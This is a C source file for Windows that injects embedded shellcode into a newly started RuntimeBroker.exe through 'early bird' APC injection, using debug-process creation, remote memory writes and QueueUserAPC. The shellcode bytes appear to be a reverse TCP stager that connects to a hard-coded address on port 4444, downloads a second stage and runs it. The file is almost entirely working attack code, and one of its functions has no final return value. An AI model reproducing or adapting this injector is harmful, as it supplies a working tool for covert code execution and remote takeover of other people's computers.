#include <Windows.h>
#include "tlhelp32.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

BOOL RunViaApcInjection(HANDLE hThread, IN PBYTE pPayload, SIZE_T sPayloadSize) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;

	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pAddress) {
		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pPayload, sPayloadSize);
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("The Protection didn't we still facing issues...\n Error 0x%lx\n", GetLastError());
		return FALSE;
	}

	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("The Protection didn't we still facing issues in QUEUEUSERAPC...\n Error 0x%lx\n", GetLastError());
		return FALSE;
	}


	return TRUE;


}

VOID AlertableFunction1() {
	// The 2nd parameter should be 'TRUE'
	SleepEx(INFINITE, TRUE);
}



BOOL CreateDebuggedProcess(LPCSTR lpProcessName, DWORD* dwProcessID,HANDLE* hProcess, HANDLE* hThread) {
	BOOL ProcessCreation = FALSE;
	CHAR lpPath[MAX_PATH * 2];
	CHAR WnDr[MAX_PATH];

	STARTUPINFO Si = { 0 };
	PROCESS_INFORMATION Pi = { 0 };



	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));


	Si.cb = sizeof(STARTUPINFO);


	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!]GetEnvVariableA failed with error : 0x%lx\n", GetLastError());
		return FALSE;
	}

	sprintf_s(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);





	
	if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, (LPSTARTUPINFOA) &Si, &Pi)) {
		printf("[!] CreateProcessA Failed with error : %d \n", GetLastError());
		return FALSE;
	}


	printf("Confirming that We got what we need ...\n");

	*dwProcessID = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

}


BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);


	printf("\tPress <Enter> To Write Payload ... ");
	getchar();
	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}




#define TARGET_PROCESS		"RuntimeBroker.exe"


int main(int argc, char* argv[]) {
	HANDLE hThread;
	DWORD dwThreadId = NULL;
	DWORD dwProcessID;
	HANDLE hProcess;
	PVOID		pAddress = NULL;




	unsigned char R0m4InShell[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48"
		"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
		"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
		"\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
		"\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
		"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
		"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
		"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
		"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
		"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
		"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
		"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
		"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
		"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xac\x1a\xb7\x42\x41\x54"
		"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
		"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
		"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
		"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
		"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
		"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
		"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
		"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
		"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
		"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
		"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
		"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
		"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
		"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
		"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
		"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
		"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
		"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
		"\x2a\x0a\x41\x89\xda\xff\xd5";


	printf("[i] Creating \"%s\" Process As A Debugged Process ... ", TARGET_PROCESS);
	if (!CreateDebuggedProcess(TARGET_PROCESS, &dwProcessID, &hProcess, &hThread)) {
		return -1;
	}
	printf("\t[i] Target Process Created With Pid : %d \n", dwProcessID);
	printf("[+] DONE \n\n");


	printf("[i] Injecting the shellcode into %s... ", TARGET_PROCESS);
	if (!InjectShellcodeToRemoteProcess(hProcess,R0m4InShell,sizeof(R0m4InShell),&pAddress)) {
		printf("Can't inject !!!! \n");
		return -1;
	}
	printf("\t[i] Target Process injected \n");
	printf("[+] DONE \n\n");



	QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL);
	printf("apc thread created %d\n", dwThreadId);


	printf("enter a letter to succeed \n");
	getchar();

	printf("Continue the debugged process! \n");
	DebugActiveProcessStop(dwProcessID);
	printf("Proces has been started ! \n");



	printf("enter a letter to quit \n");
	getchar();

	return EXIT_SUCCESS;
}